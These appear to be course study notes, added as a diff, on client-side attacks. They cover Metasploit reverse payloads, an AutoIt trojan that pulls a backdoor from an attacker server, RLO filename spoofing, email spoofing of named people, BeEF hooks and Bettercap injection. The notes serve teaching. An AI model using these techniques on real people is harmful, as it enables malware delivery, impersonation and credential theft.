@@ -500,7 +500,7 @@ The lecturer spends a lot of time here because picking the wrong one means your 
 | :--- | :--- | :--- |
 | `windows/shell/reverse_tcp` | **Platform:** Windows<br>**Type:** Shell<br>**Comm:** Reverse TCP | A basic command line for Windows that connects back to you over raw TCP. |
 | `python/meterpreter/reverse_http` | **Platform:** Python<br>**Type:** Meterpreter<br>**Comm:** Reverse HTTP | A powerful Meterpreter payload written in Python. It connects back to you pretending to be web traffic. |
-| `apple_ios/aarch64/meterpreter_reverse_tcp` | **Platform:** iOS (ARM64)<br>**Type:** Meterpreter<br>**Comm:** Reverse TCP | A payload specifically for modern iPhones (ARM64 chips) that connects back to you. |
+| `apple_ios/armle/meterpreter_reverse_http` | **Platform:** iOS (ARM64)<br>**Type:** Meterpreter<br>**Comm:** Reverse HTTP | A payload specifically for modern iPhones (ARM64 chips) that connects back to you. |
 
 ### **Summary Checklist**
 
@@ -600,8 +600,6 @@ The instructor emphasizes three settings that must match:
 | **PAYLOAD** | `windows/meterpreter/reverse_https` | `windows/meterpreter/reverse_https` | If the backdoor speaks "HTTPS" but the listener expects "TCP," they won't understand each other. |
 | **LHOST** | `192.168.0.26` (Your IP) | `192.168.0.26` (Your IP) | The listener needs to know which network interface to bind to. |
 | **LPORT** | `8080` | `8080` | If the backdoor knocks on door 8080, but you are listening at door 4444, no one answers. |
-
------
 
 ### **3. The Setup Steps**
 
@@ -707,6 +705,8 @@ This is a critical "reality check" in the lecture.
     * *Visual:* To the Windows user, nothing happens. No game opens, no document appears. It looks like the file failed.
 3.  **Connection:** However, on the Kali Linux machine, the terminal changes.
 
+![simulation of getting access to malware](image-3.png)
+
 ### **4. The Success State: "Meterpreter Session Opened"**
 
 
@@ -750,7 +750,7 @@ To beat the system, you must understand how it detects you. The instructor expla
 * **Why `msfvenom` fails here:** Since `msfvenom` is a standard tool used by millions, its "mugshot" (code signature) is already in every AV database.
 * **How to Bypass:**
     * **Change the Face:** You need to make your code look unique so it doesn't match the database.
-    * **Tools:** Packers, Encoders, Obfuscators. These tools scramble the code so it looks different but functions the same.
+    * **Tools:** Packers, Encoders, Obfuscators (Làm rối mã nguồn). These tools scramble the code so it looks different but functions the same.
     * **Manual Coding:** Writing your own unique backdoor from scratch (using Python, C++, etc.) is the most effective way because no database has seen your unique code before.
 
 #### **Method B: Dynamic/Heuristic Analysis (The Behavior Check)**
@@ -786,3 +786,809 @@ The instructor notes that this is a huge topic.
 GAINING ACCESS - CLIENT SIDE ATTACKS - SOCIAL ENGINEERING
 ===
 
+### <span style = "color: #569cd6">Maltego Basics</span>
+
+### **The Big Picture: What is Maltego?**
+
+The lecturer introduces **Maltego** as the ultimate tool for **Information Gathering** (also known as OSINT - Open Source Intelligence).
+
+  * **The Analogy:** The instructor compares Maltego to **Photoshop**. Just as Photoshop is the professional standard for design compared to MS Paint, Maltego is the professional standard for gathering data compared to basic manual searching.
+  * **The Goal:** It connects the dots. It doesn't just find information; it visualizes the *relationships* between things (e.g., how a specific email address connects to a website, which connects to a server, which connects to a specific person).
+
+### **1. Key Concepts: The Language of Maltego**
+
+To use the tool, you need to understand its specific vocabulary:
+
+  * **Entities:** These are the "nouns" of your investigation. An entity is a single item you want to investigate.
+      * *Examples:* A Person, a Website (Domain), a Phone Number, an IP Address, a Facebook Profile.
+  * **Transformers:** These are the "verbs" or plugins. A transformer is a script that takes an entity and asks a specific question to the internet.
+      * *Example:* You right-click a "Person" entity and run a transformer called "Get Email Address." Maltego searches databases and returns the results.
+  * **The Graph:** This is the workspace where you see the web of connections.
+
+---
+
+### <span style = "color: #569cd6">Intro to Trojans - Backdooring any File Type</span>
+
+### **The Big Picture: The "Trojan Horse" Strategy**
+
+In the previous lectures, you created a backdoor file (`rev_https_8080.exe`). The problem is, if you send an `.exe` file to a regular person, they will be suspicious. Who sends a program file via email?
+
+This lecture introduces a **Social Engineering** trick: **The Trojan Horse**.
+You want to present the user with something they *want* (like a funny picture, a PDF report, or a song) while secretly running your backdoor in the background.
+
+* **The Front:** The user sees a picture of a car.
+* **The Back:** Your backdoor executes silently.
+
+### **1. The Tool: "Download and Execute" Script**
+
+The instructor provides a pre-written script to do this job. You don't need to be a programmer to use it; you just need to fill in the blanks.
+```autoit-download-and-execute.txt``` (downloaded from the udemy course to Kali Linux)
+
+**How the script works:**
+It acts like a wrapper or a container. When the victim clicks the final file:
+1.  It reaches out to the internet and downloads **File A** (The Image).
+2.  It reaches out to the internet and downloads **File B** (The Backdoor).
+3.  It opens **File A** on the screen (so the victim is happy).
+4.  It runs **File B** in the background (so the hacker is happy).
+
+### **2. Configuring the Script**
+
+To make this work, you need to edit the script and provide the locations of the files you want to download.
+
+**The Syntax:**
+The script expects a list of URLs separated effectively by a comma.
+
+`"URL_TO_IMAGE" , "URL_TO_BACKDOOR"`
+
+* **First URL:** The decoy file. (e.g., A picture of a car found on Google).
+* **The Separator:** A **Comma (`,`)**. This is crucial. It tells the script where one link ends and the next begins.
+* **Second URL:** The malicious file. (e.g., The link to your `evil-files` server we set up in the previous lecture).
+
+```Local $urls = "url1,url2"```
+
+
+### **3. The Golden Rule: "Direct URLs"**
+
+The lecturer emphasizes this multiple times because it is the #1 mistake beginners make.
+
+**What is a Direct URL?**
+A direct URL points *only* to the file data, not a webpage *containing* the file.
+
+* **❌ Bad Link (Webpage):** `www.google.com/search?q=car`
+    * *Why it fails:* This loads HTML code, ads, comments, and a "Download" button. The script cannot "click" buttons; it gets confused by the HTML.
+* **✅ Good Link (Direct):** `www.example.com/images/car.jpg`
+    * *Why it works:* It ends in a file extension (like `.jpg`, `.png`, `.exe`, `.pdf`). When you visit this link, the browser shows *only* the image or immediately starts the download.
+
+**How to check:**
+Copy the link you want to use and paste it into a private browser window.
+* If you see a whole webpage with text and menus -> **It will fail.**
+* If you see *only* the image on a white/black background -> **It will work.**
+* If the file immediately downloads without asking -> **It will work.**
+
+### **4. The Example Used**
+
+In the lecture, the instructor sets up the script like this:
+
+1.  **Finds a Decoy:** He searches Google Images for a "Car," right-clicks "View Image," and copies the direct link ending in `.jpg`.
+2.  **Uses the Backdoor:** He uses the link to his own Kali Apache server (from the previous lecture): `http://10.20.14.213/evil-files/rev_https_8080.exe`.
+3.  **Combines them:**
+    `"http://.../car.jpg", "http://.../rev_https_8080.exe"`
+
+### **Summary Checklist**
+1.  **The Goal:** Make the victim feel safe by showing them a real image while hacking them.
+2.  **The Method:** A script that downloads and runs multiple files at once.
+3.  **The Syntax:** Separate every URL with a comma.
+4.  **The Requirement:** Every URL must be a **Direct Link** (ending in `.exe`, `.jpg`, etc.).
+
+---
+
+### **The Goal: The Perfect Disguise**
+In the previous lecture, you wrote a script that downloads an image and a backdoor simultaneously. However, that script was just a text file. You cannot send a text file to a victim and expect it to run.
+
+This lecture covers **Compilation**: turning that text script into a working `.exe` program that *looks* exactly like an image file, completing the illusion.
+
+### **1. The Tool: AutoIt Compiler**
+The script you wrote uses a language called **AutoIt**.
+* **What it is:** A scripting language designed for automating Windows tasks. Hackers love it because it's easy to write and compile.
+* **The Compiler:** The instructor uses a tool called "Compile Script to .exe" (often shortened to `Aut2Exe`). This tool takes your text file and "bakes" it into a finished application.
+
+### **2. The Secret Ingredient: The Icon**
+
+
+This is the most critical part of the social engineering.
+* **The Problem:** By default, an `.exe` file looks like a generic application box. If a user sees that, they won't click it.
+* **The Solution:** You can force the `.exe` to wear a "mask"—a custom icon.
+* **The Trick:** Since the decoy file is an image of a **GT-R car**, the instructor wants the program's icon to be a tiny thumbnail of that *exact same car*.
+
+**How to make the icon:**
+1.  **Download the Image:** Save the car image (`.jpg`) to your computer.
+2.  **Convert to Icon:** You cannot just use a JPG as an icon. Windows requires a specific file format called `.ico`.
+3.  **Online Converter:** The instructor uses a website (<https://www.rw-designer.com/image-to-icon>) to upload the JPG and download a converted `.ico` file.
+
+### **3. The Compilation Process (Step-by-Step)**
+
+The instructor opens the "Compile" tool and fills in three fields:
+
+1.  **Source (Input):**
+    * He selects the `AutoIt` script text file created in the last lecture.
+2.  **Destination (Output):**
+    * He chooses where to save the final file.
+3.  **Custom Icon:**
+    * He browses and selects the `car.ico` file he just created.
+
+**Click "Convert":**
+The tool churns for a second and produces `GT-R Image.exe`.
+* To the naked eye, this file looks *exactly* like a photo of a car. It has the thumbnail, and if you name it cleverly (like `GT-R_Image.exe`), most users won't notice the extension.
+
+```bash
+# in hacker computer
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 192.168.189.131
+set LPORT 8080
+show options
+exploit
+
+# in victim computer, access: "http://192.168.189.131/evil-files/cute-image.exe"
+```
+---
+
+### <span style = "color: #569cd6">Spoofing .exe Extension to Any Extension</span>
+
+### **The Final Problem: The `.exe` Extension**
+
+In the previous lectures, you created a perfect Trojan:
+1.  **Icon:** Looks like an image.
+2.  **Function:** Opens a real image (while hacking in the background).
+3.  **The Flaw:** The file name still ends in `.exe` (e.g., `car.exe`).
+
+If a victim has "Show file extensions" enabled on Windows, they will see `.exe` and know it's a program, not a picture. This lecture teaches how to hide that last clue.
+
+### **1. The Trick: Right-to-Left Override (RLO)**
+
+The instructor uses a special hidden character called the **Right-to-Left Override (RLO)**.
+<https://unicode-explorer.com/c/202E>
+
+* **What it is:** This character is designed for languages that are read from right to left (like Arabic or Hebrew). When a computer sees this character, it flips the direction of the text that follows it.
+* **The Hack:** We place this character *in the middle* of the file name to flip the letters of the extension, making the dangerous `.exe` look like a safe `.jpg`.
+
+### **2. How the Name Flip Works**
+
+This is the most confusing part, so let's break down the character manipulation step-by-step.
+
+**The Goal:**
+We want the file to *act* like an executable (`.exe`) but *look* like an image (`.jpg`).
+
+**The Setup:**
+1.  We start with a file name: `gtrgpj.exe`
+    * *Wait, why `gpj`?* Because we are going to flip it! `gpj` backwards is `jpg`.
+2.  We insert the **RLO character** right after the name `gtr`.
+
+**The Transformation:**
+
+
+* **Actual System Name:** `gtr` + `[RLO]` + `gpj.exe`
+* **What the User Sees:** The computer reads `gtr`, hits the `[RLO]`, and then displays the rest (`gpj.exe`) backwards.
+    * `exe` becomes `exe` (flipped)
+    * `.` becomes `.`
+    * `gpj` becomes `jpg`
+* **Visual Result:** `gtr` + `exe.jpg`
+
+To the user, the file is named **`gtrexe.jpg`**.
+To the computer, the file is still an `.exe` application.
+
+### **3. Naming Strategy**
+
+Since the letters immediately following the RLO character get flipped, your file name needs to make sense *after* the flip.
+* The instructor suggests using names that end in "ex" or "exe" so the flip looks natural.
+* **Example:**
+    * Name: `Refl` + `[RLO]` + `cod.exe`
+    * Becomes: `Refl` + `exe.doc` (Looks like a Word document named "Reflexe").
+
+### **4. Delivery: Using a ZIP File**
+
+The instructor adds a crucial final step: **Zipping the file.**
+
+* **The Problem:** Modern web browsers (like Chrome or Firefox) and some email providers are smart. If they detect a raw file containing the RLO character, they might strip it out or flag it as dangerous "Malware."
+* **The Solution:** Compressing the file into a `.zip` or `.rar` archive protects it. The browser downloads the ZIP safely. When the victim unzips it on their desktop, the RLO character is preserved, and the file spoofing works.
+
+### **Summary Checklist**
+1.  **RLO Character:** A special Unicode character that flips text direction.
+2.  **The Flip:** `gpj.exe` (backwards) -> `exe.jpg`.
+3.  **The Result:** A file that executes code but looks like an image.
+4.  **Protection:** Always put the spoofed file inside a ZIP archive to bypass browser filters.
+
+### **Final Course Status**
+You have now fully completed the **Client Side Attacks** section!
+* You built a backdoor (`msfvenom`).
+* You set up a listener (`msfconsole`).
+* You disguised the backdoor as an image (`AutoIt` + Icon).
+* You spoofed the extension (`RLO` trick).
+
+---
+
+### <span style = "color: #569cd6">Spoofing Emails - Setting Up an SMTP Server</span>
+
+### **The Big Picture: The Delivery Problem**
+You have spent the last few lectures building a sophisticated "digital weapon" (the Trojan). However, a weapon is useless if it sits on your own computer. You need a way to get it onto the victim's machine *and* convince them to open it.
+
+The instructor introduces **Email Spoofing** as the solution. This is a form of Social Engineering where you pretend to be someone the victim trusts.
+
+### **1. The Scenario: "The Man in the Middle"**
+
+
+To make this realistic, the instructor sets up a specific role-play scenario based on information gathered in previous steps:
+* **The Target (Victim):** Zaid (`zaid@isecurity.org`).
+* **The Persona (Impersonation):** Mohammad Askar (`m.askar@isecurity.org`), who is a friend or colleague of Zaid.
+* **The Goal:** Send an email that looks *exactly* like it came from Mohammad, asking Zaid to download the malicious file.
+
+**Why this works:** If you receive an email from a stranger with an attachment, you delete it. If you receive an email from your boss or best friend with an attachment, you usually click it without thinking.
+
+### **2. The Technical Challenge: The Spam Folder**
+This is the most critical technical lesson in this lecture. You cannot just use any tool to send fake emails.
+
+* **The "Easy" Way (Public Spoofers):**
+    There are many free websites online that let you send anonymous emails.
+    * **The Problem:** These servers are used by thousands of scammers every day. Gmail, Outlook, and Yahoo have "blacklisted" these servers.
+    * **The Result:** If you use them, your email goes straight to the **Spam/Junk folder**. The victim will never see it.
+
+* **The "Pro" Way (Dedicated SMTP):**
+    To get into the **Inbox** (Primary tab), you need a "clean" reputation.
+    * **The Solution:** Sign up for a legitimate **Email Marketing Service** (like SendGrid, Brevo, or Mailgun). These are companies used by real businesses (like Uber or Spotify) to send newsletters.
+    * **Why it works:** Because these companies ban spammers and verify users (via phone number), Gmail and Outlook trust their servers. If you send your fake email through them, it looks legitimate to the spam filters.
+
+### **3. Setting Up the Infrastructure**
+
+1.  **Sign Up:** Create an account on an Email Marketing platform.
+2.  **Verification:** Providing a real **Phone Number**.
+    * *Why?* High-quality services use phone verification to keep bots and spammers out. This exclusivity is exactly what keeps their "Reputation" high and ensures your emails hit the Inbox.
+3.  **Select a Plan:** The "Free Tier" is usually sufficient for hacking/testing because you only need to send one or two targeted emails, not thousands.
+
+---
+
+### <span style = "color: #569cd6">Spoofing Emails - Sending Emails as Any Email Account</span>
+
+### **The Goal: Sending the Fake Email**
+Now that you have a "clean" mail server account (from the previous lecture), you need a tool to actually send the email from your Kali machine. The instructor uses a command-line tool called **`sendemail`**.
+
+### **1. The Command Breakdown**
+The instructor builds a long command step-by-step. It helps to view this command in two distinct parts: **Authentication** (Logging in) and **Composition** (Writing the fake email).
+
+#### **Part A: Authentication (The Real Info)**
+These flags tell the server who you *really* are so it allows you to send mail.
+* **`-xu` (Username):** Your login for the SMTP service (e.g., `jhnwck70@gmail.com`).
+* **`-xp` (Password):** Your password for the SMTP service.
+* **`-s` (Server):** The address of the SMTP server followed by the port.
+    * *Format:* `smtp-relay.sendinblue.com:587`
+    * *Note:* Port **587** is standard for secure email submission.
+
+#### **Part B: Spoofing (The Fake Info)**
+This is the "magic" part. Even though you logged in as *User A*, you can tell the server to label the email as coming from *User B*.
+* **`-f` (From):** The email address you want the victim to *see*.
+    * *Value:* `m.askar@isecurity.org` (The trusted friend).
+* **`-t` (To):** The victim's email address.
+    * *Value:* `zaid@isecurity.org` (The target).
+
+#### **Part C: The Content**
+* **`-u` (Subject):** The subject line (e.g., "Check out this car").
+* **`-m` (Message):** The actual body text of the email.
+
+### **2. The Social Engineering Strategy**
+
+#### **The Dropbox "Direct Download" Trick**
+The instructor uses Dropbox to host the malicious file, but he uses a specific URL trick to ensure the victim runs it immediately.
+
+* **The Default Link:** Dropbox links usually end in `dl=0`.
+    * *Result:* When clicked, it opens a Dropbox *webpage* with a preview of the file and a "Download" button. This gives the victim time to think or hesitate.
+* **The Hacker Trick:** Change the end of the URL to **`dl=1`**.
+    * *Result:* When clicked, the browser **immediately downloads** the file without opening the Dropbox page. It removes a step and increases the success rate.
+
+#### **Tone and Context**
+Because the attacker is pretending to be a friend (`m.askar`), the tone is casual ("Hey man..."). If they were pretending to be a bank or a boss, the tone would be formal. Matching the tone is crucial for the disguise.
+
+### **3. The Current Limitation**
+* **What works:** The email arrives in the Inbox (not Spam) and shows the spoofed email address (`m.askar@isecurity.org`).
+* **What's missing:** Most email clients display a **Sender Name** (e.g., "Mohammad Askar") next to the email address. Currently, our email just shows the raw email address.
+
+---
+
+### <span style = "color: #569cd6">Spoofing Emails - Spoofing Sender Name</span>
+
+### **The Goal: The Perfect Identity**
+In the previous lecture, the email arrived safely, but it only showed the raw email address (`m.askar@isecurity.org`). Real emails from friends usually display their **Full Name** (e.g., "Mohammad Askar").
+
+### **1. The Command Upgrade: Advanced Headers**
+The instructor uses the same `sendemail` tool but adds a specific "Advanced Option" flag (`-o`).
+
+* **The Logic:** Email clients (like Gmail or Outlook) look at the "Header" of an email to decide what to display to the user. By manually rewriting this header, you can force the client to display whatever name you want.
+
+* **The Syntax:**
+    The flag is `-o message-header=...`.
+    You specifically want to change the **"From"** header.
+
+    **The Format:**
+    `"From: [Fake Name] <[Fake Email]>"`
+
+* **The Full Flag Used:**
+    `-o message-header="From: Mohammad Askar <m.askar@isecurity.org>"`
+
+**How the Command Looks Now:**
+The command is now split into three logical parts:
+1.  **Login (Real):** `-xu [User] -xp [Pass] -s [Server]` (Authenticating with the mail server).
+2.  **Compose (Content):** `-t [Target] -u [Subject] -m [Body]` (Writing the email).
+3.  **Spoof (Fake):** `-f [FakeEmail] -o message-header="From: Name <FakeEmail>"` (Lying about the sender).
+
+### **2. The Result**
+When the victim receives this email:
+* **Sender Name:** "Mohammad Askar" (Perfect match).
+* **Photo:** If the victim's email client has a contact photo saved for that email address, it will display that photo automatically.
+* **Trust:** Because it looks exactly like previous real emails from Mohammad, the victim clicks the link without hesitation.
+
+### **3. The Reality Check: DMARC and SPF**
+The instructor ends with a crucial warning. This attack is powerful, but it **does not work on every domain**.
+
+* **The Defense:**
+    Modern domains use security protocols called **SPF** (Sender Policy Framework) and **DMARC** (Domain-based Message Authentication, Reporting, and Conformance).
+    * *Analogy:* Think of DMARC as a "Guest List" at a club. If a domain (like `google.com`) has DMARC enabled, it tells the world: "Only *these* specific servers are allowed to send email as Google. If you see an email from Google coming from a stranger's server, delete it."
+
+* **The Vulnerability:**
+    The attack works because **many organizations (claimed 80%) do not set up DMARC correctly**.
+    * *The Test:* The instructor visits a DMARC checker website. He types in the target domain (`zsecurity.org`). The result shows "No DMARC record found."
+    * *The Meaning:* This means `zsecurity.org` has **no guest list**. Anyone on the internet can pretend to be them, and email servers will accept it.
+
+### **Summary Checklist**
+1.  **Visual Spoofing:** Use `-o message-header` to add the Friendly Name.
+2.  **Targeting:** This works best against domains that lack email security (DMARC).
+3.  **Platform Agnostic:** This delivery method works for any target (Windows, Mac, Android) as long as the attachment file works on that device.
+4.  **Defense:** If you own a domain, you *must* enable DMARC to prevent hackers from impersonating you.
+
+---
+
+### <span style = "color: #569cd6">Spoofing Emails - Method 2</span>
+
+### **The Big Picture: Why use Web Hosting?**
+
+In the previous lecture, you acted like a mailman carrying a letter to the post office (using an SMTP client on your computer). In *this* lecture, you are renting the entire post office.
+
+* **The Concept:** Instead of using a tool on your computer (like `sendemail`) to connect to a server, you upload a small script (a "robot") to a paid web server. You tell the robot what to write, and the server sends the email for you.
+* **The Advantage:** Web servers are powerful. They are trusted by other mail servers (like Gmail or Yahoo) because they are legitimate businesses. This typically gives you excellent **Inbox delivery rates**.
+
+### **1. The Prerequisites**
+
+* **Free vs. Paid:** You generally **cannot** use free web hosting (like 000webhost). Free providers almost always block the "send email" function to prevent spammers.
+* **The Solution:** You need a **Cheap Paid Plan** (e.g., DreamHost, HostGator, Bluehost). Even the cheapest "Shared Hosting" plan ($3-5/month) works perfectly because it unlocks the PHP `mail()` function.
+
+### **2. The Setup: "The Robot" (`send.php`)**
+
+The core of this attack is a simple PHP script provided in the course resources. You don't need to know how to code to use it; you just need to know where to put it.
+
+
+
+**The Workflow:**
+1.  **Access File Manager:** Log into your hosting control panel and find the **File Manager**.
+2.  **Locate Public Folder:** Open the `public_html` (or just `public`) folder. This is the only folder the outside world can see.
+3.  **Upload:** Upload the `send.php` file here.
+
+*Note on Extension:* The instructor mentions uploading it as a `.txt` first if the uploader blocks `.php`, then renaming it to `.php` inside the file manager.
+
+### **3. The Execution: The Web Form**
+
+Once the file is uploaded, you don't use your terminal anymore. You use your browser.
+
+1.  **Navigate:** Go to `www.your-hosting-domain.com/send.php`.
+2.  **The Interface:** You will see a simple form asking for:
+    * **To:** The victim's email.
+    * **From:** The fake email (e.g., `adrian@zsecurity.org`).
+    * **Name:** The fake name (e.g., "Adrian Bude").
+    * **Subject/Body:** The content.
+3.  **Send:** When you click Submit, the web server executes the code and dispatches the email immediately.
+
+### **4. The Results: Why is this better?**
+
+The instructor demonstrates that this method is highly effective for one key reason: **Contact Syncing**.
+
+* **The Profile Picture Trick:**
+    * If the victim has the "Fake Sender" saved in their contacts (e.g., they have Adrian saved in their phone), Gmail will see the incoming email, match the email address, and **automatically display Adrian's real profile picture and phone number**.
+    * This happens even though the email didn't actually come from Adrian. The email client trusts the address you spoofed.
+
+* **The "Via" Warning (The Catch):**
+    * Because you are sending from a hosting server (e.g., `dreamhost.com`) but claiming to be from `gmail.com` or `zsecurity.org`, sophisticated inboxes (like Gmail) might display a small grey tag saying: *"via dreamhost.com"*.
+    * However, most mobile users and non-technical users ignore this tag, especially if the profile picture looks correct.
+
+### **Summary Comparison**
+
+| Feature | Method 1: SMTP Client (`sendemail`) | Method 2: Web Hosting (`send.php`) |
+| :--- | :--- | :--- |
+| **Tool** | Command Line (Kali Linux) | Web Browser |
+| **Cost** | Free (using free SMTP relay) | Paid (~$5/mo hosting) |
+| **Complexity** | High (Authentication/Flags) | Low (Fill out a form) |
+| **Inbox Rate** | Variable (Depends on SMTP rep) | **High** (Hosting servers have good rep) |
+
+---
+
+### <span style = "color: #569cd6">BeEF Overview & Basic Hook Method</span>
+
+### **Introduction to BeEF**
+
+**BeEF** (Browser Exploitation Framework) is a powerful security tool designed to turn a web browser into an attack vector. Unlike other tools that attack the operating system directly, BeEF focuses on "hooking" the web browser to assess the security posture of a target. Once a browser is hooked, the attacker can execute commands, steal credentials, scan the internal network, or even gain full control over the system.
+
+### **1. Getting Started**
+
+To use BeEF on Kali Linux, follow these steps as demonstrated in the lecture:
+
+* **Launch:** Open the terminal or application menu and run `beef start`.
+* **Set Password:** If it is your first time running it, the terminal will ask you to set a password for the `beef` user. (Note: Characters will not appear on screen while typing for security).
+* **Web Interface:** BeEF will automatically open your browser to the control panel (usually `http://127.0.0.1:3000/ui/panel`).
+* **Login:** Use the username `beef` and the password you just set.
+
+
+### **2. The "Hook": How It Works**
+
+The core mechanism of BeEF is a small piece of **JavaScript** code. For BeEF to work, the victim's browser must execute this specific script.
+
+
+
+The script looks like this:
+`<script src="http://<Your-Kali-IP>:3000/hook.js"></script>`
+
+When a browser loads this line of code, it reaches out to your BeEF server and becomes "hooked." It will then appear in your BeEF control panel, allowing you to send commands to it.
+
+**Delivery Methods:**
+* **Man-in-the-Middle (MITM):** Inject the script into non-secure pages the victim visits.
+* **XSS (Cross-Site Scripting):** Inject the script into a vulnerable legitimate website.
+* **Social Engineering:** Trick the victim into visiting a webpage you control that contains the hook.
+
+### **3. Practical Demo: Hosting the Hook**
+
+The lecture demonstrates the **Social Engineering** method by hosting a malicious page on your own machine:
+
+1.  **Locate Web Root:** Navigate to `/var/www/html/` (the default folder for the Apache web server).
+2.  **Create the Page:** Edit the `index.html` file.
+3.  **Insert the Hook:** Paste the hook script into the file.
+    * *Crucial Step:* Change the IP address in the script (e.g., `127.0.0.1`) to your actual Kali machine IP (found using `ifconfig`).
+4.  **Start Server:** Run `service apache2 start` to turn on your web server.
+5.  **Execute:** When the victim visits your IP address, their browser loads the `index.html`, executes the JavaScript, and connects back to you.
+
+### **4. The Control Panel**
+
+Once a victim is hooked, their IP address appears in the **Online Browsers** panel on the left. Clicking it reveals several tabs:
+
+* **Details:** Displays gathered intelligence about the victim (Browser version, OS, Screen size, Plugins, etc.).
+* **Logs:** Shows a history of events and commands executed.
+* **Commands:** This is the main attack menu. It contains modules to:
+    * Steal passwords (via fake login prompts).
+    * Detect social media sessions.
+    * Redirect the browser.
+    * Scan the victim's local network.
+
+To stop the framework, simply run `beef stop` in your terminal.
+
+---
+
+### <span style = "color: #569cd6">BeEF - Hooking Targets Using Bettercap</span>
+
+**Injecting the BeEF Hook using Man-in-the-Middle (MitM) attacks**.
+
+### **The Goal: "Hooking" Without Clicking**
+
+In the previous lecture, you had to trick the victim into visiting *your* specific malicious webpage (like the one hosted on your IP).
+In *this* lecture, the method is much more dangerous. By performing a **Man-in-the-Middle (MitM)** attack, you can inject the BeEF hook into **ANY** website the victim visits (e.g., StackOverflow, Bing, a news site).
+
+  * **The Concept:** You stand in the middle of the victim's connection. When they ask for a webpage, you fetch it for them, but before giving it to them, you secretly "glue" your malicious BeEF code onto it.
+
+### **Step 1: Preparing the Injection Script**
+
+You cannot paste the entire BeEF hook code directly into the Bettercap configuration because it's too long. Instead, we use a small JavaScript file that acts as a loader.
+
+1.  **The File:** The instructor uses a file named `injectbeef.js`.
+2.  **The Code:** This script simply tells the browser: *"Hey, create a new script element and load the resource located at `http://[Attacker_IP]:3000/hook.js`."*
+3.  **The Configuration:** You must open this file and change the IP address to your **Kali Linux IP** (e.g., `10.20.14.207`).
+
+### **Step 2: Configuring Bettercap**
+
+Now you need to tell **Bettercap** (the tool doing the MITM attack) to insert this file into the traffic it intercepts.
+
+The instructor modifies the **HSTS Hijack Caplet** (`hstshijack.cap`). This file controls how Bettercap handles secure traffic.
+
+**The Modification:**
+He edits the `payloads` line in the caplet file. The syntax used is:
+`[Target_Domains]:[Path_To_Script]`
+
+  * **Target Domains:** `*` (This means "Inject into ALL websites").
+  * **Path:** `/root/Downloads/injectbeef.js` (The file we prepared in Step 1).
+
+**The Final Config Line looks something like this:**
+`hstshijack.payloads = *:/root/Downloads/injectbeef.js`
+
+### **Step 3: Launching the Attack**
+
+Now the trap is set. The instructor runs the attack in two stages using the terminal:
+
+1.  **Start Spoofing (ARP Spoofing):**
+
+    ```bash
+    bettercap -iface eth0 -caplet spoof.cap
+    ```
+
+      * *What this does:* It tells the network, "I am the router." All traffic from the victim now flows through your computer.
+
+2.  **Start Hijacking (HSTS Bypass & Injection):**
+    Inside the Bettercap console, he types:
+
+    ```bash
+    hstshijack/hstshijack
+    ```
+
+      * *What this does:*
+          * **Downgrades HTTPS:** It forces secure sites (HTTPS) to load as insecure (HTTP) so you can read and modify them.
+          * **Injects Code:** It reads your `injectbeef.js` and inserts it into every page the victim loads.
+
+### **Step 4: The Result**
+
+1.  **The Victim's View:** They browse to a normal site like `stackoverflow.com`. The site loads normally (though it might be HTTP instead of HTTPS).
+
+2.  **The Attack:** Behind the scenes, the browser unknowingly executes your injected script.
+
+3.  **The Hook:** The script reaches out to your BeEF server.
+
+4.  **Success:**
+
+    On your Kali machine, the victim's IP address appears in the **BeEF Online Browsers** panel. You now have control over their browser session.
+
+### **Summary Checklist**
+
+1.  **Prepare:** Edit `injectbeef.js` with your Kali IP.
+2.  **Configure:** Edit `hstshijack.cap` to include the path to `injectbeef.js`.
+3.  **Execute:** Run Bettercap with `spoof.cap` and then activate `hstshijack`.
+4.  **Verify:** Check the BeEF interface for the new hooked browser.
+
+---
+
+### <span style = "color: #569cd6">Running Basic Commands On Targets</span>
+
+### **The Control Center: Using Commands**
+
+Once a browser is "hooked," the **Commands** tab becomes your control panel. The instructor explains that while there are hundreds of available commands (too many to cover in one video), they all work similarly:
+1.  **Select:** Find the command in the category list (or use the Search bar).
+2.  **Configure:** Set any necessary options (like the text you want to display or the URL to redirect to).
+3.  **Execute:** Click the "Execute" button at the bottom right.
+4.  **View Results:** Click the command in the history log to see the output (e.g., the screenshot returned).
+
+### **1. Basic Connectivity Tests**
+These commands are mostly used to verify that your "hook" is still active and working.
+
+* **Alert Dialog:**
+    * **Function:** Pops up a standard JavaScript alert box on the victim's screen with a message you write (e.g., "Test").
+    * **Why use it?** It is the quickest way to confirm you have control. If the box appears on their screen, the connection is good.
+* **Raw JavaScript:**
+    * **Function:** This is a "power user" tool. It allows you to write *any* custom JavaScript code and run it on the victim's machine.
+    * **Use Case:** If BeEF doesn't have a pre-made button for a specific attack you want to do (like a specific keylogger or data scraper), you can paste your own code here.
+
+### **2. Surveillance Modules**
+These commands allow you to spy on the user without them knowing.
+
+* **Spyder Eye (Screenshot):**
+    * **Function:** Takes a snapshot of the *content* inside the browser window and sends the image back to you.
+    * **Use Case:** Seeing exactly what the victim is looking at (e.g., banking details, private emails) in real-time.
+* **Webcam:**
+    * **Function:** Attempts to turn on the victim's webcam. (Note: Modern browsers usually ask the user for permission first, so this is harder to pull off unnoticed).
+
+### **3. Social Engineering & redirection**
+This is one of the most dangerous categories. These commands manipulate the browser to trick the user into making a mistake.
+
+* **Redirect Browser:**
+    * **Function:** Forcibly changes the website the victim is looking at. You type a URL (e.g., your malicious site), and their browser immediately loads it.
+    * **The Strategy:** The instructor highlights that this is rarely used just for fun. It is a **setup** for a bigger attack:
+        * **Phishing:** Redirect them from a real site to a fake login page you control.
+        * **Malware Delivery:** Redirect them to a page that says "Critical Update Required" which automatically downloads your Backdoor (Trojan).
+
+---
+### <span style = "color: #569cd6">BeEF - Using Passwords Using A Fake Login Prompt</span>
+
+Here is the detailed explanation of the **Social Engineering Credential Harvester** lecture (often called the **"Pretty Theft"** module in BeEF).
+
+### **The Goal: Stealing Passwords via "Session Timeout"**
+
+In previous lectures, you learned how to redirect a user to a fake website. However, smart users might notice the URL is wrong (e.g., `faceb00k.com` instead of `facebook.com`).
+
+This lecture introduces a smarter, cleaner way to steal passwords that **does not** require the user to leave the current page.
+
+### **1. The Concept: The "Pop-Up" Trick**
+
+Instead of sending the victim to a fake website, this attack draws a fake login box *on top* of the website they are currently visiting.
+
+* **The Lie:** The browser dims the background and shows a message: *"You have been logged out of your session. Please log in again to continue."*
+* **The Psychology:** This is a common occurrence on the internet. Users are used to sessions timing out, so they instinctively type their password to get back to what they were doing without checking the URL.
+
